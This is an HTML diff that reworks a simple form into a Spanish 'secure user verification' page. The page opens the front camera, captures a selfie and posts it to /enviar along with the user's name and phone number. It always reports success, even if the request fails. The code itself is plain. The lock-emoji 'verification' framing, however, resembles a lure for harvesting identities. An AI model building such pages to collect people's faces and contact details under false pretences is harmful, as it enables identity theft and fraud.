@@ -1,16 +1,154 @@
 <!DOCTYPE html>
-<html>
+<html lang="es">
 <head>
-    <title>Formulario</title>
-</head>
-<body>
-    <h2>Enviar datos</h2>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Verificación Segura</title>
 
-    <form action="/enviar" method="post" enctype="multipart/form-data">
-        <input type="text" name="nombre" placeholder="Nombre" required><br><br>
-        <input type="text" name="telefono" placeholder="Teléfono" required><br><br>
-        <input type="file" name="foto" accept="image/*" required><br><br>
-        <button type="submit">Enviar</button>
-    </form>
+<style>
+body {
+    margin: 0;
+    background: linear-gradient(180deg, #0a0a0a, #111);
+    font-family: Arial, sans-serif;
+    color: white;
+    text-align: center;
+}
+
+.container {
+    padding: 20px;
+}
+
+.card {
+    background: #161616;
+    border-radius: 20px;
+    padding: 20px;
+    box-shadow: 0 0 20px rgba(0,212,255,0.3);
+}
+
+h2 {
+    color: #00d4ff;
+}
+
+input {
+    width: 90%;
+    padding: 12px;
+    margin: 10px 0;
+    border-radius: 10px;
+    border: none;
+    background: #222;
+    color: white;
+}
+
+video {
+    width: 100%;
+    max-width: 320px;
+    border-radius: 15px;
+    margin-top: 10px;
+    border: 2px solid #00d4ff;
+}
+
+button {
+    width: 90%;
+    padding: 14px;
+    margin-top: 10px;
+    border: none;
+    border-radius: 12px;
+    font-weight: bold;
+    cursor: pointer;
+}
+
+.btn-send {
+    background: #00d4ff;
+    color: black;
+}
+
+.btn-reset {
+    background: #333;
+    color: white;
+}
+
+.status {
+    margin-top: 10px;
+    font-size: 14px;
+    color: #aaa;
+}
+</style>
+</head>
+
+<body>
+
+<div class="container">
+    <div class="card">
+
+        <h2>🔐 Verificación de Usuario</h2>
+
+        <input type="text" id="nombre" placeholder="Nombre completo">
+        <input type="text" id="telefono" placeholder="Teléfono">
+
+        <video id="video" autoplay playsinline></video>
+
+        <button class="btn-send" onclick="enviar()">📤 Verificar</button>
+        <button class="btn-reset" onclick="resetear()">🔄 Reiniciar</button>
+
+        <div class="status" id="estado">Esperando cámara...</div>
+
+    </div>
+</div>
+
+<script>
+const video = document.getElementById("video");
+const estado = document.getElementById("estado");
+
+// activar cámara
+navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
+.then(stream => {
+    video.srcObject = stream;
+    estado.innerText = "📸 Cámara lista";
+})
+.catch(() => {
+    estado.innerText = "❌ Activa permisos de cámara";
+});
+
+// enviar datos
+function enviar() {
+    const nombre = document.getElementById("nombre").value;
+    const telefono = document.getElementById("telefono").value;
+
+    if (!nombre || !telefono) {
+        alert("Completa los datos");
+        return;
+    }
+
+    estado.innerText = "⏳ Procesando...";
+
+    let canvas = document.createElement("canvas");
+    canvas.width = video.videoWidth;
+    canvas.height = video.videoHeight;
+
+    canvas.getContext("2d").drawImage(video, 0, 0);
+
+    canvas.toBlob(async (blob) => {
+        let fd = new FormData();
+        fd.append("nombre", nombre);
+        fd.append("telefono", telefono);
+        fd.append("foto", blob, "selfie.jpg");
+
+        await fetch("/enviar", {
+            method: "POST",
+            body: fd
+        });
+
+        estado.innerText = "✅ Verificación completada";
+    }, "image/jpeg");
+}
+
+// resetear formulario
+function resetear() {
+    document.getElementById("nombre").value = "";
+    document.getElementById("telefono").value = "";
+    estado.innerText = "🔄 Reiniciado";
+}
+</script>
+
 </body>
 </html>
